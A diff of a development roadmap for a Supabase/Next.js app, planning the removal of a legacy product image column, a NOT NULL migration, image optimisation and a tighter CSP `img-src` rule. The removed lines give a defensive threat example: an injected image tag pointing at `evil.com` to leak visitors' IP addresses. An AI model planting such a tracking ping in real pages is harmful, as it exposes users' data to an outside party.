@@ -47,15 +47,30 @@ Several files define inline `selectClassName` strings that duplicate `<Input>` s
 - [ ] Create `src/components/ui/select.tsx` wrapping a native `<select>` with Input-matching styles
 - [ ] Replace inline select styling in `location-form-dialog.tsx`, `gedu-groups-card.tsx`, and any other occurrences
 
-### Host Product Images and Tighten CSP `img-src`
+### Drop `products.image_url` (PR 3 of self-hosted images)
 
-Product images are currently arbitrary URLs provided by admins. The CSP `img-src` directive must allow `https:` (any HTTPS source) to accommodate this, which means an attacker who achieves HTML injection could load `<img src="https://evil.com/track?...">` to ping an external server and leak the visitor's IP.
+Migration 00027 added `products.image_path` and dropped `NOT NULL` from `image_url`; PR 2 switched all reads/writes to `image_path`. The legacy `image_url` column is unused but still on the table, and `get_my_groups()` still returns both columns. Final cleanup:
 
-- [ ] Add image upload to product creation (Supabase Storage or an image CDN like Cloudinary)
-- [ ] Migrate existing product image URLs to hosted images
-- [ ] Tighten CSP `img-src` from `'self' data: blob: https:` to `'self' data: blob: https://your-cdn-domain.com` in `src/proxy.ts`
+- [ ] Migration: `ALTER TABLE products ALTER COLUMN image_path SET NOT NULL; ALTER TABLE products DROP COLUMN image_url;`
+- [ ] Drop and recreate `get_my_groups()` returning only `product_image_path`
+- [ ] Regenerate `database.types.ts`, remove the `image_url` legs from the `Product*` and `MyGroupWithDetails` overrides in `src/types/index.ts`, and drop the `assertProductShape` cast in `products.service.ts`
 
-**Why:** The current `https:` wildcard is low risk (admins are trusted, and `<img>` tags can't read cookies or page content), but tightening it to a specific domain closes the exfiltration-via-image-ping vector entirely. This is the last meaningful CSP gap after the nonce-based `script-src` fix.
+**Nullability gap to close once the self-hosted images code is live on staging:** `products.image_path` was added nullable (migration 00027) so the additive rollout could ship without breaking existing inserts. `get_my_groups()` declares `product_image_path TEXT` in `RETURNS TABLE` and the type generator emits `product_image_path: string`, but the underlying column can be null, so `MyGroupWithDetails` currently promises non-null on a value that could be null at runtime. Once staging is running the branch that writes `image_path` on every new product (`feature/self-hosted-product-images-pr1` and follow-ups) and every existing row has been backfilled, push `ALTER TABLE products ALTER COLUMN image_path SET NOT NULL` as a standalone migration — it doesn't need to wait for the final `DROP COLUMN image_url` cleanup above. After the NOT NULL lands, regenerate types and confirm `MyGroupWithDetails.product_image_path` is `string` with no runtime gap.
+
+### Optimize Product Images via `next/image`
+
+Product images currently render with `unoptimized` everywhere, so the original bucket file is served at every viewport. If the catalogue grows or pages get heavier, switching to the Next image optimizer would give us automatic WebP/AVIF conversion, viewport-appropriate resizing, and CDN caching. The cost is a bit of complexity per call site (`sizes` attribute) and a one-line `images.remotePatterns` entry in `next.config.ts`.
+
+- [ ] Add the Supabase Storage host to `next.config.ts` `images.remotePatterns`
+- [ ] Drop `unoptimized` from product image `<Image>` components and add a `sizes` prop matching each layout
+- [ ] Skipped during the PR 2 self-hosted images migration to keep the change minimal
+
+### Tighten CSP `img-src` for Self-Hosted Images
+
+Now that product images live in a single Supabase Storage bucket, `src/proxy.ts` was updated to scope `img-src` to the Supabase host instead of the `https:` wildcard. Audit the dev environment to make sure no other code path still pulls images from arbitrary HTTPS hosts before this change ships in production.
+
+- [ ] Smoke-test `/clubs`, `/clubs/[id]`, `/admin/products`, `/admin/products/[id]`, `/admin/products/add` for CSP violations in the browser console
+- [ ] Confirm no other feature loads remote images outside `*.supabase.co` (avatars, OG previews, embedded content, etc.)
 
 
 ### Parent-Managed Gamer Profile Fields (DOB, Gender)
